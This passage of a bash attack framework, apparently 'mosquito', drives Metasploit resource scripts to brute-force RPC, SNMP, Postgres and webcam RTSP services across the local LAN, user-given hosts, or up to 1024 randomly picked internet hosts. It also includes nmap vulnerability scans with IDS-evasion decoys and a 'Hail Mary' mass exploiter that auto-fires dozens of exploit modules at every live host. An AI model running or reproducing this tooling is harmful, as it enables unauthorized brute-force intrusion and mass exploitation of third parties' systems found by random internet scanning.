   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource rpc_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 205.72.213.47 199.197.116.190" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource rpc_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 800 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource rpc_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# Brute Force snmp service :: done
#
sh_twelve () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} snmp_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource snmp_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 192.249.87.128 24.24.40.36" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource snmp_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource snmp_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# Brute Force postgres service :: done
#
sh_treze () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} postgres_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource postgres_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 205.88.183.168 185.99.212.190" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource postgres_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource postgres_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



sh_quatorze () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} rtsp_url_brute resource_"${Reset};
   sleep 1
   IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;setg LHOST $IPADDR;resource rtsp-url-brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 201.203.27.251 159.121.101.207" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;resource rtsp-url-brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 700 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg LHOST $IPADDR;resource rtsp-url-brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}


sh_easter_egg () {
echo "${BlueF}[${YellowF}running${BlueF}]:${white} 🦟Nmap nse quick scans🦟 ${BlueF}[${YellowF}top-ports${BlueF}]"${Reset};
sleep 1

## Local variable declarations
IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan Local Lan (fast)" FALSE "Scan Local Lan (discovery)" FALSE "Scan Local Lan (vulns)" FALSE "Scan User Input Host(s)" --width 330 --height 220) > /dev/null 2>&1
## random database xml file generator
rand=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 6 | head -n 1)

   ## Scan Local Lan (fast)
   if [ "$scan" = "Scan Local Lan (fast)" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
      msfconsole -q -x "workspace -a mosquito;db_nmap -sn $RANGE.0/24;db_export -f xml -a $IPATH/logs/database_$rand.xml;hosts -C address,name,os_name,purpose,info;workspace -d mosquito"
   ## Scan Local Lan (nse discovery categorie)
   elif [ "$scan" = "Scan Local Lan (discovery)" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
      top_pp=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input top-ports to scan\nExample: 1000" --width 450) > /dev/null 2>&1
      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports $top_pp --open --script=nbstat.nse,smb-os-discovery.nse,smb-enum-shares.nse,smb-vuln-regsvc-dos.nse,telnet-ntlm-info.nse,ssl-ccs-injection.nse,http-slowloris-check.nse,http-mobileversion-checker.nse $RANGE.0/24;db_export -f xml -a $IPATH/logs/database_$rand.xml;hosts -C address,name,os_name,purpose,info;services -c port,proto,name,state;workspace -d mosquito"
   ## Scan Local Lan (nse vuln categorie)
   elif [ "$scan" = "Scan Local Lan (vulns)" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
      top_pp=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input top-ports to scan\nExample: 1000" --width 450) > /dev/null 2>&1
      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports $top_pp --open --script=vuln $RANGE.0/24;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $RANGE.0/24;db_export -f xml -a $IPATH/logs/database_$rand.xml;hosts -C address,name,os_name,purpose,info;services -c port,proto,name,state;workspace -d mosquito"
   ## Scan User Input Host(s) (nse vuln categorie)
   elif [ "$scan" = "Scan User Input Host(s)" ]; then
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 192.168.1.71 192.168.1.254" --width 450) > /dev/null 2>&1
      echo "${BlueF}[☠]${white} Scanning Local Machine: $rhost🦟"${Reset};
      top_pp=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input top-ports to scan\nExample: 1000" --width 450) > /dev/null 2>&1
      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports $top_pp --open --script=vuln $rhost;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $rhost;db_export -f xml -a $IPATH/logs/database_$rand.xml;hosts -C address,name,os_name,purpose,info;services -c port,proto,name,state;workspace -d mosquito"
   else
      ## None option selected ..aborting..
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# HAIL MARY (mass_exploiter.rc)
#
sh_hail_mary () {
echo "${BlueF}[${YellowF}running${BlueF}]:${white} mass_exploiter resource_"${Reset};sleep 1
## mass_exploiter banner
echo "" && echo ""
echo ${BlueF}"                 🦟 armitage Hail Mary (based) resource script 🦟"${Reset};
cat << !
                 ------------------------------------------------
    mass_exploiter.rc resource script allow us to scan user inputs (rhosts/lhosts)
    or import an database.xml file to msfdb and auto-run multiple exploit modules
    againts all alive db hosts based on their port number(s) or service name(s).
    'This module exploits ports: 21:22:23:80:110:139:445:1433:3306:3389:8080:55553'
    'And Loads [46] exploits and [11] auxiliarys scanners in MAX_PORTS scan mode'


!
echo -n "${BlueF}[${YellowF}?${BlueF}]${white} Execute mass_exploiter.rc script? (y/n)${RedF}:${white}"${Reset};read question
if [ "$question" = "y" ] || [ "$question" = "Y" ]; then

## Local variable declarations
IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan user input rhosts" FALSE "Import database.xml (rhosts)" FALSE "Suggest exploits (dont exploit)" --width 320 --height 210) > /dev/null 2>&1
if [ "$scan" = "Import database.xml (rhosts)" ]; then
   dbx=$(zenity --title "🦟 MOSQUITO 🦟" --filename=$IPATH --file-selection --text "chose database.xml file to import") > /dev/null 2>&1
elif [ "$scan" = "Suggest exploits (dont exploit)" ]; then
  :
else
   rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 117.2.40.217 45.32.87.101" --width 450) > /dev/null 2>&1
fi

if ! [ "$scan" = "Suggest exploits (dont exploit)" ]; then
scan_max=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Scan MAX number of ports or regular scan?\nWARNING: Scanning MAX ports it will take longer." --radiolist --column "Pick" --column "Option" TRUE "Scan default ports (fast)" FALSE "Scan MAX number of ports" --width 330 --height 180) > /dev/null 2>&1
   if [ "$scan_max" = "Scan default ports (fast)" ]; then
      max_value="false"
   else
      max_value="true"
   fi
decoy=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Nmap IDS evasion decoy technic" --radiolist --column "Pick" --column "Option" TRUE "Use www.apple.org decoy (default)" FALSE "Manualy set the 2º decoy ip addr" --width 320 --height 180) > /dev/null 2>&1
fi

   #
   # scanning user inputs
   #
   if [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Import user inputs (rhosts) to database."${Reset};      
      # manualy set 2º decoy ip addr ?
      if [ "$decoy" = "Use www.apple.org decoy (default)" ]; then
         msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;setg MAX_PORTS $max_value;resource mass_exploiter.rc"
      else
         msfconsole -q -x "setg SET_DECOY true;setg RHOSTS $rhost;setg LHOST $IPADDR;setg MAX_PORTS $max_value;resource mass_exploiter.rc"
      fi

   #
   # suggest exploit modules
   #
   elif [ "$scan" = "Suggest exploits (dont exploit)" ]; then
      echo "${BlueF}[${YellowF}running${BlueF}]:${white} mass_exploiter - exploit suggester."${Reset};
      msfconsole -q -x "setg SUGGEST true;resource mass_exploiter.rc"

   #
   # Import database.xml file to msfdb
   #
   elif [ "$scan" = "Import database.xml (rhosts)" ]; then
      echo "${BlueF}[☠]${white} Import database.xml (rhosts) to database."${Reset};
      # manualy set 2º decoy ip addr ?
      if [ "$decoy" = "Use www.apple.org decoy (default)" ]; then
         msfconsole -q -x "setg IMPORT_DB $dbx;setg LHOST $IPADDR;setg MAX_PORTS $max_value;resource mass_exploiter.rc"
      else
         msfconsole -q -x "setg SET_DECOY true;setg IMPORT_DB $dbx;setg LHOST $IPADDR;setg MAX_PORTS $max_value;resource mass_exploiter.rc"
      fi
   ## None option sellected..aborting ..
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi

else
   echo "${BlueF}[${RedF}x${BlueF}]${white} Aborting Module execution 🦟Bzzzz.."${Reset};
   sleep 2 && sh_main
fi
sh_main
}



###################################################################
#                   * 🦟 MOSQUITO MAIN MENU 🦟 *                  #
###################################################################
sh_main () {
rm -f 1024 > /dev/nul 2>&1
}
# loop forever
while :
do
clear
echo "---"${BlueF}
cat << !
                                                🦟__________       
              _______🦟________________________  ___(_) _  /______🦟
           __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
           /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
                                     /_/ 🦟 Author:r00t-3xp10it        🦟
!
echo "" && echo "${BlueF}    ${RedF}:${BlueF}Framework Description${RedF}:${BlueF}"${Reset};
cat << !
       Mosquito uses metasploit auxiliary modules + nmap nse + resource files
       to be abble to automate remote brute force tasks over WAN/LAN networks.
       'scan Local Lan, scan user inputs (rhosts),Search WAN for random hosts'

!
echo "---"
echo "    ${RedF}:${BlueF}USER${RedF}:${white}$user ${BlueF}ENV${RedF}:${white}$EnV ${BlueF}INTERFACE${RedF}:${white}$InT3R ${BlueF}ARCH${RedF}:${white}$ArCh ${BlueF}DISTRO${RedF}:${white}$DiStRo ${BlueF}HOSTNAME${RedF}:${white}$htn"${Reset};
cat << !
    ╔──────────╦───────────────────────╦────────────────────────────────────────╗
    ║  OPTION  ║     RESOURCE FILE     ║               DESCRIPTION              ║
    ╠──────────╬───────────────────────╬────────────────────────────────────────╣
    ║    1     ║     geo_location      ║   scan remote hosts geo location       ║
    ║    2     ║     brute_force       ║   scan - brute most commom ports       ║
    ║    3     ║     ms17_010          ║   scan - brute remote smb service      ║
    ║    4     ║     ssh_brute         ║   scan - brute remote ssh service      ║
    ║    5     ║     ftp_brute         ║   scan - brute remote ftp service      ║
    ║    6     ║     http_cve          ║   scan - brute remote http service     ║
    ║    7     ║     winrm_brute       ║   scan - brute remote winrm service    ║
    ║    8     ║     mysql_brute       ║   scan - brute remote mysql service    ║
    ║    9     ║     mssql_brute       ║   scan - brute remote mssql service    ║
    ║   10     ║     telnet_brute      ║   scan - brute remote telnet service   ║
    ║   11     ║     rpc_brute         ║   scan - brute remote rpc service      ║
    ║   12     ║     snmp_brute        ║   scan - brute remote snmp service     ║
    ║   13     ║     postgres_brute    ║   scan - brute remote postgres serv    ║
    ║   14     ║     rtsp_url_brute    ║   scan for remote live webcam's url's  ║
    ╠──────────╩───────────────────────╩────────────────────────────────────────╣
    ║    E     -     Exit mosquito                                              ║
    ║    N     -     Nmap nse quick scans                                       ║
    ╚───────────────────────────────────────────────────────────────────────────╣
!
echo "                                                           🦟${BlueF}SSA${YellowF}©${RedF}RedTeam${YellowF}@${BlueF}2019${white}🦟─╝"${Reset};
echo ""
echo "${BlueF}[☠]${white} mosquito framework"${Reset}
sleep 1
echo -n "${BlueF}[${GreenF}➽${BlueF}]${white} Chose Option number${RedF}:${white}"${Reset};
read choice
case $choice in
1|one|ONE)
    sh_one # geo_location function
;;
2|two|TWO)
    sh_two # most common ports brute force function
;;
3|three|THREE)
    sh_tree  # ms17_010 (smb) function
;;
4|four|FOUR)
    sh_quatro  # SSH function
;;
5|five|FIVE)
    sh_cinco  # FTP function
;;
6|six|SIX)
    sh_six  # HTTP CVE function
;;
7|seven|SEVEN)
    sh_seven  # WINRM snmp function
;;
8|eight|EIGTH)
    sh_oito  # MYSQL  function
;;
9|nine|NINE)
    sh_nine  # MSSQL function
;;
10|ten|TEN)
    sh_ten  # TELNET function
;;
11|eleven|ELEVEN)
    sh_onze  # RPC function
;;
12|twelve|TWELVE)
    sh_twelve  # SNMP function
;;
13|thirteen|THIRTEEN)
    sh_treze  # POSTGRES function
;;
14|fourteen|FOURTEEN)
    sh_quatorze  # RTSP (webcams) function
;;
n|N|nmap|NMAP)
    ## Mosquito Nmap nse quick scans
    # whitehat - search for vuln's/cve's in local lan
    sh_easter_egg
;;
exp|expl|explo|exploi|exploit|Exploit|EXPLOIT)
   sh_hail_mary # mass_exploiter.rc
;;
e|E|exit|EXIT)
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Closing framework 🦟Bzzzz."${Reset};
    service postgresql stop | zenity --progress --pulsate --title "🦟 PLEASE WAIT 🦟" --text="Stoping postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
rm -f ip_range.txt > /dev/nul 2>&1
exit
;;
h|H|help|HELP)
    echo "${BlueF}[${YellowF}i${BlueF}] [${YellowF}EXECUTE${BlueF}] sudo ./mosquito.sh -h"${Reset};
    service postgresql stop | zenity --progress --pulsate --title "🦟 PLEASE WAIT 🦟" --text="Stoping postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
exit
;;
*)
    echo "${BlueF}[${RedF}x${BlueF}]${white} '${RedF}$choice${white}': is not a valid Option 🦟Bzzzz."${Reset};
    sleep 2 && sh_main
;;
esac
done
